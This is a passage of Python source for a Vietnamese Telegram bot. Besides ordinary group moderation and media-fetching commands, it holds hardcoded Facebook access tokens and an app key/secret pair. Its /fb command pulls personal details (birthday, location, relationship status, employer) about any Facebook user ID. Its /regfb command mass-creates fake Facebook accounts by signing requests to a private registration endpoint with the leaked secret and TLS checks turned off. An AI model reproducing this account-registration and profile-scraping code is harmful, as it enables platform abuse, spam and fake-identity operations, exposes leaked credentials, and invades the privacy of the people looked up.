    try:
        # C·∫•m chat ng∆∞·ªùi d√πng trong 15 ph√∫t
        until_date = int(time.time()) + 30 * 60
        bot.restrict_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            can_send_messages=False,
            can_send_media_messages=False,
            can_send_polls=False,
            can_send_other_messages=False,
            can_add_web_page_previews=False,
            until_date=until_date
        )
        
        # G·ª≠i tin nh·∫Øn th√¥ng b√°o ng∆∞·ªùi d√πng ƒë√£ b·ªã c·∫•m chat trong 15 ph√∫t
        bot.send_message(
            message.chat.id, 
            f"<blockquote>‚ö†Ô∏è Ng∆∞·ªùi d√πng v·ªõi ID {user_id} ƒë√£ b·ªã c·∫£nh b√°o v√† c·∫•m chat trong 30 ph√∫t.</blockquote>",
            parse_mode='HTML'
        )
    except Exception as e:
        # N·∫øu c√≥ l·ªói x·∫£y ra
        bot.reply_to(message, "<blockquote>Kh√¥ng th·ªÉ c·∫£nh b√°o ng∆∞·ªùi d√πng. Vui l√≤ng ki·ªÉm tra l·∫°i th√¥ng tin ho·∫∑c quy·ªÅn h·∫°n c·ªßa bot.</blockquote>", parse_mode='HTML')
        print(f"Error warning user: {e}")

@bot.message_handler(commands=['unim'])
def unrestrict_user(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return
    
    # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ch·ª©a th√¥ng tin c·∫ßn thi·∫øt kh√¥ng
    if not message.reply_to_message:
        bot.reply_to(message, '<blockquote>Vui l√≤ng tr·∫£ l·ªùi tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng c·∫ßn h·ªßy c·∫•m chat.</blockquote>', parse_mode='HTML')
        return

    user_id = message.reply_to_message.from_user.id
    
    try:
        # G·ª° b·ªè h·∫°n ch·∫ø chat cho ng∆∞·ªùi d√πng
        bot.restrict_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            can_send_messages=True,
            can_send_media_messages=True,
            can_send_polls=True,
            can_send_other_messages=True,
            can_add_web_page_previews=True,
            until_date=0  # Kh√¥ng c·∫•m chat n·ªØa
        )
        
        # G·ª≠i tin nh·∫Øn th√¥ng b√°o ng∆∞·ªùi d√πng ƒë√£ ƒë∆∞·ª£c ph√©p chat tr·ªü l·∫°i
        bot.send_message(
            message.chat.id, 
            f"<blockquote>‚úÖ Ng∆∞·ªùi d√πng v·ªõi ID {user_id} ƒë√£ ƒë∆∞·ª£c ph√©p chat tr·ªü l·∫°i.</blockquote>", 
            parse_mode='HTML'
        )
    except Exception as e:
        # N·∫øu c√≥ l·ªói x·∫£y ra
        bot.reply_to(message, '<blockquote>Kh√¥ng th·ªÉ g·ª° c·∫•m chat cho ng∆∞·ªùi d√πng. Vui l√≤ng ki·ªÉm tra l·∫°i th√¥ng tin ho·∫∑c quy·ªÅn h·∫°n c·ªßa bot.</blockquote>', parse_mode='HTML')
        print(f"Error unrestricted user: {e}")
# File l∆∞u danh s√°ch block
BLOCKED_USERS_FILE = "block.txt"

# T·∫°o file block n·∫øu ch∆∞a t·ªìn t·∫°i
if not os.path.exists(BLOCKED_USERS_FILE):
    with open(BLOCKED_USERS_FILE, "w") as f:
        f.write("")

# H√†m ƒë·ªçc danh s√°ch block t·ª´ file
def load_blocked_users():
    with open(BLOCKED_USERS_FILE, "r") as f:
        return [int(user_id.strip()) for user_id in f.readlines() if user_id.strip().isdigit()]

# H√†m l∆∞u danh s√°ch block v√†o file
def save_blocked_users(blocked_users):
    with open(BLOCKED_USERS_FILE, "w") as f:
        f.write("\n".join(map(str, blocked_users)))

# Load danh s√°ch ng∆∞·ªùi d√πng b·ªã block
BLOCKED_USERS = load_blocked_users()

# H√†m ki·ªÉm tra ng∆∞·ªùi d√πng c√≥ b·ªã block hay kh√¥ng
def is_blocked(user_id):
    return user_id in BLOCKED_USERS

# H√†m block ng∆∞·ªùi d√πng
def block_user(user_id):
    if user_id not in BLOCKED_USERS:
        BLOCKED_USERS.append(user_id)
        save_blocked_users(BLOCKED_USERS)

# H√†m unblock ng∆∞·ªùi d√πng
def unblock_user(user_id):
    if user_id in BLOCKED_USERS:
        BLOCKED_USERS.remove(user_id)
        save_blocked_users(BLOCKED_USERS)

@bot.message_handler(commands=["ban"])
def ban_user(message):
    if not is_admin(message):  # Ki·ªÉm tra quy·ªÅn admin
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return  # Tho√°t n·∫øu kh√¥ng c√≥ quy·ªÅn

    target_user_id = None

    # L·∫•y ID t·ª´ tr·∫£ l·ªùi tin nh·∫Øn
    if message.reply_to_message:
        target_user_id = message.reply_to_message.from_user.id

    # L·∫•y ID t·ª´ tham s·ªë n·∫øu ƒë∆∞·ª£c nh·∫≠p
    elif len(message.text.split()) > 1:
        try:
            target_user_id = int(message.text.split()[1])
        except ValueError:
            bot.reply_to(message, "‚ùå ID ng∆∞·ªùi d√πng kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p ID h·ª£p l·ªá.")
            return

    # Ki·ªÉm tra n·∫øu kh√¥ng c√≥ ng∆∞·ªùi d√πng n√†o ƒë∆∞·ª£c x√°c ƒë·ªãnh
    if not target_user_id:
        bot.reply_to(message, "‚ùå Kh√¥ng th·ªÉ x√°c ƒë·ªãnh ng∆∞·ªùi d√πng c·∫ßn ban. H√£y tr·∫£ l·ªùi tin nh·∫Øn ho·∫∑c nh·∫≠p ID.")
        return

    # Block ng∆∞·ªùi d√πng
    block_user(target_user_id)

    # Kick ng∆∞·ªùi d√πng kh·ªèi nh√≥m
    try:
        bot.kick_chat_member(message.chat.id, target_user_id)
        bot.reply_to(message, f"‚úÖ Ng∆∞·ªùi d√πng {target_user_id} ƒë√£ b·ªã c·∫•m v√† b·ªã ƒëu·ªïi kh·ªèi nh√≥m.")
    except Exception as e:
        bot.reply_to(message, f"‚ö†Ô∏è Kh√¥ng th·ªÉ kick ng∆∞·ªùi d√πng.")

@bot.message_handler(commands=['tiktok'])
def tiktokdl(message):
    if not bot_active:
        bot.send_message(message.chat.id, "ü§ñ VuThiHoa-BOT\nVuThiHoa ƒêang T·∫Øt Hi·ªán C√°c Th√†nh Vi√™n Kh√¥ng Th·ªÉ S·ª≠ D·ª•ng")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "üé¨ [/tiktok <Link Video>] üé¨")
        return

    url = args[1]
    api_url = f"https://tikwm.com/api/?url={url}"

    bot.reply_to(message, "üí∏ ƒêang GET Th√¥ng Tin Video üí∏")

    try:
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()

        if 'data' in data and 'play' in data['data']:
            video_url = data['data']['play']
            title = data['data'].get('title', 'Video TikTok')

            video_response = requests.get(video_url)
            video_response.raise_for_status()
            video_file = BytesIO(video_response.content)
            video_file.name = f"{title}.mp4"

            message_text = f"<b>üé¨ Video Name:</b> <i>{title}</i>"
            bot.send_message(message.chat.id, message_text, parse_mode='HTML')
            bot.send_video(message.chat.id, video_file, caption="üé¨ Video Play üé¨")

        else:
            bot.reply_to(message, "üí∏ L·ªói Server üí∏")

    except requests.RequestException:
        bot.reply_to(message, "üí∏ L·ªói Server üí∏")

@bot.message_handler(commands=['gai'])
def send_gai_image(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    api_url = "https://subhatde.id.vn/images/gai"

    # Send a "searching" message
    searching_message = bot.reply_to(message, "üîé")
    sent_messages.append(searching_message.message_id)  # Store the message ID

    try:
        # Request image data from the API
        response = requests.get(api_url)
        data = response.json()

        # Delete the "searching" message after getting the response
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted

        # Check if response contains an "url" field
        if 'url' in data:
            image_url = data['url']

            # Send the image to the user with a caption
            caption_text = f"·∫¢nh M√† B·∫°n Y√™u C·∫ßu, @{message.from_user.username}"
            sent_message = bot.send_photo(message.chat.id, image_url, caption=caption_text)
            sent_messages.append(sent_message.message_id)  # Store the message ID

            # Start a thread to delete all messages after 60 seconds
            threading.Thread(target=delete_all_messages_after_delay, args=(message.chat.id, 60)).start()
        else:
            bot.reply_to(message, "Kh√¥ng t√¨m th·∫•y ·∫£nh t·ª´ API.")
    except Exception as e:
        # Delete the "searching" message if an error occurs
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra")

@bot.message_handler(commands=['anime'])
def send_gai_image(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    api_url = "https://keyherlyswar.x10.mx/Apidocs/anhanime.php"

    # Send a "searching" message
    searching_message = bot.reply_to(message, "üîé")
    sent_messages.append(searching_message.message_id)  # Store the message ID

    try:
        # Request image data from the API
        response = requests.get(api_url)
        data = response.json()

        # Delete the "searching" message after getting the response
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted

        # Check if response contains an "url" field
        if 'url' in data:
            image_url = data['url']

            # Send the image to the user with a caption
            caption_text = f"·∫¢nh M√† B·∫°n Y√™u C·∫ßu, @{message.from_user.username}"
            sent_message = bot.send_photo(message.chat.id, image_url, caption=caption_text)
            sent_messages.append(sent_message.message_id)  # Store the message ID

            # Start a thread to delete all messages after 60 seconds
            threading.Thread(target=delete_all_messages_after_delay, args=(message.chat.id, 60)).start()
        else:
            bot.reply_to(message, "Kh√¥ng t√¨m th·∫•y ·∫£nh t·ª´ API.")
    except Exception as e:
        # Delete the "searching" message if an error occurs
        try:
            bot.delete_message(searching_message.chat.id, searching_message.message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Ignore if already deleted
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra")

@bot.message_handler(commands=['vdanime'])
def send_random_anime_video(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    try:
        waiting_message = bot.reply_to(message, "ƒêang l·∫•y ·∫£nh...‚åõ")

        # L·∫•y video t·ª´ API
        response = requests.get("https://keyherlyswar.x10.mx/Apidocs/anhanime.php", timeout=5)  # timeout ƒë·ªÉ tr√°nh ch·ªù qu√° l√¢u
        data = response.json()

        if data and "url" in data:
            video_url = data["url"]
            bot.send_video(
                chat_id=message.chat.id,
                video=video_url,
                caption="üé¨ ·∫£nh anime ng·∫´u nhi√™n üé•"
            )
        else:
            bot.send_message(message.chat.id, "Kh√¥ng th·ªÉ l·∫•y ·∫£nh anime ng·∫´u nhi√™n.")
        
        bot.delete_message(message.chat.id, waiting_message.message_id)
    
    except requests.Timeout:
        bot.send_message(message.chat.id, "Qu√° th·ªùi gian ch·ªù API. Vui l√≤ng th·ª≠ l·∫°i.")
    except Exception as e:
        bot.send_message(message.chat.id, f"ƒê√£ c√≥ l·ªói x·∫£y ra")

# H√†m ƒë·ªÉ x√≥a t·∫•t c·∫£ th√¥ng ƒëi·ªáp sau m·ªôt kho·∫£ng th·ªùi gian nh·∫•t ƒë·ªãnh
def delete_all_messages_after_delay(chat_id, delay):
    time.sleep(delay)
    # X√≥a c√°c th√¥ng ƒëi·ªáp ƒë√£ g·ª≠i (th·ª±c hi·ªán v·ªõi c√°c message_id ƒë√£ l∆∞u)
    for message_id in sent_messages:
        try:
            bot.delete_message(chat_id, message_id)
        except telebot.apihelper.ApiTelegramException:
            pass  # Kh√¥ng l√†m g√¨ n·∫øu th√¥ng ƒëi·ªáp ƒë√£ b·ªã x√≥a ho·∫∑c kh√¥ng t·ªìn t·∫°i


# H√†m x·ª≠ l√Ω l·ªánh /capcut
@bot.message_handler(commands=['capcut'])
def i4cap(message):

    command_data = message.text.split()

    if len(command_data) != 2:
        bot.reply_to(message, "Vui l√≤ng nh·∫≠p link h·ª£p l·ªá theo c√∫ ph√°p:\n /capcut [link]")
        return

    link = command_data[1]
    api_url = f"https://subhatde.id.vn/capcut/info?url={link}"
    searching_message = bot.reply_to(message, "üîé")

    try:
        response = requests.get(api_url)
        # X√≥a th√¥ng ƒëi·ªáp t√¨m ki·∫øm
        bot.delete_message(searching_message.chat.id, searching_message.message_id)

        data = response.json()

        if 'user' in data:
            user_info = data['user']
            statistics = data['user_statistics']
            relation_info = user_info.get('relation_info', {}).get('statistics', {})

            name = user_info.get('name', 'Kh√¥ng c√≥ t√™n')
            avatar_url = user_info.get('avatar_url', '')
            followers = relation_info.get('follower_count', 'Kh√¥ng c√≥ th√¥ng tin')
            likes = statistics.get('like_count', 'Kh√¥ng c√≥ th√¥ng tin')

            message_text = f"üîé @{message.from_user.username} ƒë√£ y√™u c·∫ßu th√¥ng tin cho link: {link}\n" \
                           f"üë§ T√™n: {name}\n" \
                           f"üìä Ng∆∞·ªùi theo d√µi: {followers}\n" \
                           f"‚ù§Ô∏è L∆∞·ª£t th√≠ch: {likes}"

            if avatar_url:
                sent_message = bot.send_photo(message.chat.id, avatar_url, caption=message_text)
            else:
                sent_message = bot.send_message(message.chat.id, message_text)

            sent_messages.append(sent_message.message_id)
            threading.Thread(target=delete_all_messages_after_delay, args=(message.chat.id, 60)).start()

        else:
            bot.reply_to(message, "Kh√¥ng t√¨m th·∫•y th√¥ng tin cho link n√†y.")
    except Exception as e:
        bot.delete_message(searching_message.chat.id, searching_message.message_id)
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra: {str(e)}")

@bot.message_handler(commands=['avtfb'])
def get_facebook_avatar(message):
    user_id = message.from_user.id

    # Check command format
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng\nExample: /avtfb [link ho·∫∑c id]')
        return
    
    # G·ª≠i tin nh·∫Øn ch·ªù x·ª≠ l√Ω
    waiting_message = bot.reply_to(message, 'üîç')

    # Get parameter from the message
    parameter = message.text.split()[1]

    # Determine if it's a Facebook ID or a link
    if parameter.isdigit():  # If it's a Facebook ID
        facebook_id = parameter
    else:  # If it's a Facebook link
        if 'facebook.com' not in parameter:
            bot.edit_message_text('Li√™n k·∫øt kh√¥ng ph·∫£i t·ª´ Facebook', message.chat.id, waiting_message.message_id)
            return
        
        # Use the API to get the Facebook ID from the URL
        api_url = f"https://keyherlyswar.x10.mx/Apidocs/findid.php?url={parameter}"
        try:
            api_response = requests.get(api_url)
            api_response.raise_for_status()
            json_response = api_response.json()
            
            if 'id' in json_response:
                facebook_id = json_response['id']
            else:
                bot.edit_message_text('Kh√¥ng th·ªÉ l·∫•y ID t·ª´ li√™n k·∫øt Facebook. Vui l√≤ng th·ª≠ l·∫°i v·ªõi m·ªôt li√™n k·∫øt kh√°c.', message.chat.id, waiting_message.message_id)
                return
            
        except requests.RequestException as e:
            bot.edit_message_text(f'C√≥ l·ªói x·∫£y ra khi truy c·∫≠p API: {e}', message.chat.id, waiting_message.message_id)
            return
        except Exception as e:
            bot.edit_message_text(f'C√≥ l·ªói x·∫£y ra: {e}', message.chat.id, waiting_message.message_id)
            return

    # Use the provided Facebook URL for the profile picture
    graph_url = f"https://graph.facebook.com/{facebook_id}/picture?width=1500&height=1500&access_token=2712477385668128%7Cb429aeb53369951d411e1cae8e810640"
    
    try:
        response = requests.get(graph_url)
        response.raise_for_status()
        
        # Send the avatar image to the user with a caption
        caption = f"<b>Avatar cho Facebook ID ho·∫∑c link</b>: <code>{facebook_id}</code>"
        bot.send_photo(message.chat.id, response.url, caption=caption, parse_mode='html')
        
        # X√≥a tin nh·∫Øn ch·ªù sau khi ho√†n th√†nh
        bot.delete_message(message.chat.id, waiting_message.message_id)
    
    except requests.RequestException as e:
        bot.edit_message_text(f'C√≥ l·ªói x·∫£y ra khi truy c·∫≠p Facebook: {e}', message.chat.id, waiting_message.message_id)
    except Exception as e:
        bot.edit_message_text(f'C√≥ l·ªói x·∫£y ra: {e}', message.chat.id, waiting_message.message_id)


# H√†m l·∫•y Facebook ID t·ª´ URL
def get_facebook_id_from_url(facebook_url):
    try:
        # API ƒë·ªÉ l·∫•y Facebook ID t·ª´ li√™n k·∫øt
        api_url = f"https://apiquockhanh.click/facebook/uid?link={facebook_url}"
        response = requests.get(api_url)
        response.raise_for_status()  # Ki·ªÉm tra n·∫øu c√≥ l·ªói HTTP
        
        # Parse d·ªØ li·ªáu JSON tr·∫£ v·ªÅ t·ª´ API
        data = response.json()
        
        # Ki·ªÉm tra n·∫øu c√≥ th√¥ng tin ID trong d·ªØ li·ªáu tr·∫£ v·ªÅ
        if 'id' in data:
            return data['id']
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

# H√†m ƒë·ªãnh d·∫°ng th·ªùi gian
from dateutil import parser 
# H√†m ƒë·ªãnh d·∫°ng th·ªùi gian c√≥ h·ªó tr·ª£ timezone
def format_timestamp(timestamp):
    try:
        # S·ª≠ d·ª•ng parser ƒë·ªÉ ph√¢n t√≠ch chu·ªói th·ªùi gian v·ªõi timezone
        timestamp_obj = parser.isoparse(timestamp)  # T·ª± ƒë·ªông x·ª≠ l√Ω c·∫£ m√∫i gi·ªù
        return timestamp_obj.strftime("%d-%m-%Y - %H:%M:%S")  # ƒê·ªãnh d·∫°ng l·∫°i ki·ªÉu ng√†y th√°ng gi·ªù ph√∫t gi√¢y
    except Exception as e:
        print(f"Error formatting timestamp: {e}")
        return "Kh√¥ng c√≥ d·ªØ li·ªáu"
    
def get_facebook_info(uid):
    """G·ªçi API l·∫•y th√¥ng tin t·ª´ UID"""
    api_url = f"https://api.sumiproject.net/facebook/getinfov2?uid={uid}&apikey=apikeysumi"
    try:
        response = requests.get(api_url)
        response.raise_for_status()
        data = response.json()

        print(f"[DEBUG] Full API Response:\n{data}")  # In to√†n b·ªô JSON API

        if not data or "Th√¥ng tin c√° nh√¢n" not in data or not isinstance(data["Th√¥ng tin c√° nh√¢n"], dict):
            return None, "‚ùå API kh√¥ng tr·∫£ v·ªÅ d·ªØ li·ªáu h·ª£p l·ªá!"

        return data, None
    except requests.RequestException as e:
        return None, f"‚ö†Ô∏è L·ªói khi g·ªçi API: {e}"

@bot.message_handler(commands=['fb'])
def handle_fb_command(message):
    waiting_message = bot.reply_to(message, 'üîç ƒêang l·∫•y th√¥ng tin, vui l√≤ng ch·ªù...')

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.edit_message_text("‚ö†Ô∏è Vui l√≤ng s·ª≠ d·ª•ng ƒë√∫ng ƒë·ªãnh d·∫°ng: /fb {UID}", message.chat.id, waiting_message.message_id)
            return

        uid = args[1]
        print(f"[DEBUG] ƒêang l·∫•y th√¥ng tin Facebook cho UID: {uid}")

        data, error_message = get_facebook_info(uid)
        if error_message:
            bot.edit_message_text(error_message, message.chat.id, waiting_message.message_id)
            return

        personal_info = data.get("Th√¥ng tin c√° nh√¢n", {})
        location_info = data.get("V·ªã tr√≠ hi·ªán t·∫°i", {})
        education_info = data.get("H·ªçc v·∫•n", {})
        work_info = data.get("N∆°i l√†m vi·ªác", {})
        images_info = data.get("H√¨nh ·∫£nh", {})

        def get_value(data_dict, field, default="Kh√¥ng c√≥"):
            return data_dict.get(field, default)

        fb_id = uid
        name = get_value(personal_info, "T√™n")
        surname = get_value(personal_info, "H·ªç")
        username = get_value(personal_info, "Username")
        gender = get_value(personal_info, "Gi·ªõi t√≠nh")
        profile_link = get_value(personal_info, "Li√™n k·∫øt")
        bio = get_value(personal_info, "Gi·ªõi thi·ªáu")
        birthday = get_value(personal_info, "Ng√†y sinh")
        relationship_status = get_value(personal_info, "T√¨nh tr·∫°ng m·ªëi quan h·ªá")
        followers = get_value(personal_info, "Ng∆∞·ªùi theo d√µi")
        following = get_value(personal_info, "ƒêang theo d√µi")
        timezone = get_value(personal_info, "M√∫i gi·ªù")
        language = get_value(personal_info, "Ng√¥n ng·ªØ")
        last_update = get_value(personal_info, "C·∫≠p nh·∫≠t l·∫ßn cu·ªëi")
        location = get_value(location_info, "T√™n")
        university = get_value(education_info, "Tr∆∞·ªùng ƒê·∫°i h·ªçc")
        major = get_value(education_info, "Chuy√™n ng√†nh")
        company = get_value(work_info, "C√¥ng ty")
        job_title = get_value(work_info, "V·ªã tr√≠")

        avatar_url = get_value(images_info, "Avatar", f"https://graph.facebook.com/{fb_id}/picture?width=1500&height=1500")
        if not avatar_url:
            avatar_url = "https://via.placeholder.com/1500?text=No+Image"

        caption = (
            f"<b>üîç Th√¥ng Tin Facebook</b>\n\n"
            f"üë§ <b>ID:</b> {fb_id}\n"
            f"üë§ <b>T√™n:</b> {name} {surname}\n"
            f"üßë <b>Gi·ªõi t√≠nh:</b> {gender}\n"
            f"üåê <b>Username:</b> {username}\n"
            f"üéÇ <b>Ng√†y sinh:</b> {birthday}\n"
            f"üîó <a href='{profile_link}'>Li√™n k·∫øt Facebook</a>\n"
            f"üí¨ <b>Gi·ªõi thi·ªáu:</b> {bio}\n"
            f"üíë <b>T√¨nh tr·∫°ng:</b> {relationship_status}\n"
            f"üë• <b>Ng∆∞·ªùi theo d√µi:</b> {followers}\n"
            f"üë§ <b>ƒêang theo d√µi:</b> {following}\n"
            f"üïë <b>M√∫i gi·ªù:</b> {timezone}\n"
            f"üåç <b>Ng√¥n ng·ªØ:</b> {language}\n"
            f"üìÖ <b>C·∫≠p nh·∫≠t l·∫ßn cu·ªëi:</b> {last_update}\n"
            f"üìç <b>V·ªã tr√≠ hi·ªán t·∫°i:</b> {location}\n"
            f"üéì <b>H·ªçc v·∫•n:</b> {university} ({major})\n"
            f"üíº <b>N∆°i l√†m vi·ªác:</b> {company} - {job_title}\n"
        )

        print(f"[DEBUG] Caption:\n{caption}")  # Ki·ªÉm tra n·ªôi dung g·ª≠i Telegram

        bot.send_photo(message.chat.id, avatar_url, caption=caption, parse_mode='HTML')
        bot.delete_message(message.chat.id, waiting_message.message_id)

    except Exception as e:
        print(f"[ERROR] {e}")
        bot.edit_message_text(f"‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh", message.chat.id, waiting_message.message_id)

#s·ª≠ l√≠ reg acc fb 282
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


app = {
    'api_key': '882a8490361da98702bf97a021ddc14d',
    'secret': '62f8ce9f74b12f84c123cc23437a4a32'
}

email_prefix = [
    'gmail.com',
    'hotmail.com',
    'yahoo.com',
    'live.com',
    'rocket.com',
    'outlook.com',
]


def create_account_html():
  
    random_birth_day = datetime.strftime(datetime.fromtimestamp(random.randint(
        int(time.mktime(datetime.strptime('1980-01-01', '%Y-%m-%d').timetuple())),
        int(time.mktime(datetime.strptime('1995-12-30', '%Y-%m-%d').timetuple()))
    )), '%Y-%m-%d')

  
    names = {
        'first': ['JAMES', 'JOHN', 'ROBERT', 'MICHAEL', 'WILLIAM', 'DAVID'],
        'last': ['SMITH', 'JOHNSON', 'WILLIAMS', 'BROWN', 'JONES', 'MILLER'],
        'mid': ['Alexander', 'Anthony', 'Charles', 'Dash', 'David', 'Edward']
    }

   
    random_first_name = random.choice(names['first'])
    random_name = f"{random.choice(names['mid'])} {random.choice(names['last'])}"
    password = f'{random.randint(0, 9999999)}?#@'
    full_name = f"{random_first_name} {random_name}"
    md5_time = hashlib.md5(str(time.time()).encode()).hexdigest()

 
    hash_ = f"{md5_time[0:8]}-{md5_time[8:12]}-{md5_time[12:16]}-{md5_time[16:20]}-{md5_time[20:32]}"
    email_rand = f"{full_name.replace(' ', '').lower()}{hashlib.md5((str(time.time()) + datetime.strftime(datetime.now(), '%Y%m%d')).encode()).hexdigest()[0:6]}@{random.choice(email_prefix)}"
    gender = 'M' if random.randint(0, 10) > 5 else 'F'

  
    req = {
        'api_key': app['api_key'],
        'attempt_login': True,
        'birthday': random_birth_day,
        'client_country_code': 'EN',
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
        'fb_api_req_friendly_name': 'registerAccount',
        'firstname': random_first_name,
        'format': 'json',
        'gender': gender,
        'lastname': random_name,
        'email': email_rand,
        'locale': 'en_US',
        'method': 'user.register',
        'password': password,
        'reg_instance': hash_,
        'return_multiple_errors': True
    }

    sig = ''.join([f'{k}={v}' for k, v in sorted(req.items())])
    ensig = hashlib.md5((sig + app['secret']).encode()).hexdigest()
    req['sig'] = ensig

    api = 'https://b-api.facebook.com/method/user.register'

    def _call(url='', params=None, post=True):
        headers = {
            'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'
        }
        if post:
            response = requests.post(url, data=params, headers=headers, verify=False)
        else:
            response = requests.get(url, params=params, headers=headers, verify=False)
        return response.text

    reg = _call(api, req)
    reg_json = json.loads(reg)
    uid = reg_json.get('session_info', {}).get('uid')
    access_token = reg_json.get('session_info', {}).get('access_token')

 
    error_code = reg_json.get('error_code')
    error_msg = reg_json.get('error_msg')

    if uid is not None and access_token is not None:
       
        return f"""
        <blockquote expandable>
        <b>Birthday üéÇ:</b> {random_birth_day}\n
        <b>Fullname ¬ÆÔ∏è:</b> {full_name}\n
        <b>Email üìß :</b> {email_rand}\n
        <b>Password üîë:</b> {password}\n
        <b>UID üÜî:</b> {uid}\n
        <b>Token üéß:</b> {access_token}\n
        </blockquote>
        """
    else:
        
        if error_code and error_msg:
            return f"""
            <b>Error Code:</b> {error_code}\n
            <b>Error Message:</b> {error_msg}\n
            """
        else:
            return "<b>Error:</b> Unknown error occurred. Please try again."


@bot.message_handler(commands=['regfb'])
def send_account_info(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    account_info_html = create_account_html()
    bot.send_message(message.chat.id, account_info_html, parse_mode="HTML")


# L·ªánh /lock: ƒê·ªÉ kh√≥a chat
@bot.message_handler(commands=['lock'])
def lock_chat(message):
    if not is_admin(message):  # Ki·ªÉm tra quy·ªÅn admin
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    try:
        # Kh√≥a chat cho t·∫•t c·∫£ c√°c th√†nh vi√™n
        bot.restrict_chat_member(message.chat.id, message.chat.id, can_send_messages=False)
        
        # Th√¥ng b√°o cho admin r·∫±ng chat ƒë√£ b·ªã kh√≥a
        bot.reply_to(message, "Chat ƒë√£ b·ªã kh√≥a. C√°c th√†nh vi√™n kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn.")

    except Exception as e:
        bot.reply_to(message, 'Kh√¥ng th·ªÉ kh√≥a chat.')

# L·ªánh /unlock: ƒê·ªÉ m·ªü kh√≥a chat
@bot.message_handler(commands=['unlock'])
def unlock_chat(message):
    if not is_admin(message):  # Ki·ªÉm tra quy·ªÅn admin
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    try:
        # M·ªü kh√≥a chat cho t·∫•t c·∫£ th√†nh vi√™n
        bot.restrict_chat_member(message.chat.id, message.chat.id, can_send_messages=True)
        
        # Th√¥ng b√°o cho admin r·∫±ng chat ƒë√£ ƒë∆∞·ª£c m·ªü kh√≥a
        bot.reply_to(message, "Chat ƒë√£ ƒë∆∞·ª£c m·ªü kh√≥a. C√°c th√†nh vi√™n c√≥ th·ªÉ g·ª≠i tin nh·∫Øn tr·ªü l·∫°i.")

    except Exception as e:
        bot.reply_to(message, 'Kh√¥ng th·ªÉ m·ªü kh√≥a chat. L·ªói: ' + str(e))

@bot.message_handler(commands=['id_you'])
def get_user_id(message):
    if not is_admin(message):  # Ki·ªÉm tra quy·ªÅn admin
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return
    # Ki·ªÉm tra xem tin nh·∫Øn c√≥ ph·∫£i l√† tr·∫£ l·ªùi m·ªôt tin nh·∫Øn kh√°c kh√¥ng
    if not message.reply_to_message:
        bot.reply_to(message, '<blockquote>Vui l√≤ng tr·∫£ l·ªùi tin nh·∫Øn c·ªßa ng∆∞·ªùi m√† b·∫°n mu·ªën l·∫•y ID.</blockquote>', parse_mode='HTML')
        return
    
    # L·∫•y ID c·ªßa ng∆∞·ªùi d√πng m√† b·∫°n ƒëang tr·∫£ l·ªùi
    user_id = message.reply_to_message.from_user.id
    username = message.reply_to_message.from_user.username or "Kh√¥ng c√≥ username"

    # G·ª≠i ID c·ªßa ng∆∞·ªùi d√πng
    bot.reply_to(message, f'<blockquote>ID c·ªßa ng∆∞·ªùi d√πng: <b>{user_id}</b></blockquote>', parse_mode='HTML')


@bot.message_handler(content_types=['new_chat_members'])
def welcome_new_member(message):
    markup = types.InlineKeyboardMarkup()
    seachADM = types.InlineKeyboardButton(text='Admin', callback_data='Admin')
    markup.add(seachADM)
    # Ki·ªÉm tra n·∫øu c√≥ th√†nh vi√™n m·ªõi
    if not message.new_chat_members:
        return

    for new_member in message.new_chat_members:
        # L·∫•y t√™n ng∆∞·ªùi d√πng m·ªõi (username) ho·∫∑c t√™n hi·ªÉn th·ªã (first name)
        username = new_member.username
        first_name = new_member.first_name
        
        # T·∫°o th√¥ng ƒëi·ªáp ch√†o m·ª´ng
        if username:
            user_info = f"@{username}"
        else:
            user_info = first_name
        
        # N·ªôi dung tin nh·∫Øn ch√†o m·ª´ng v·ªõi th·∫ª HTML
        welcome_text = f'''
<blockquote>
üéâ Ch√†o m·ª´ng {user_info} ƒë·∫øn v·ªõi nh√≥m! üéâ
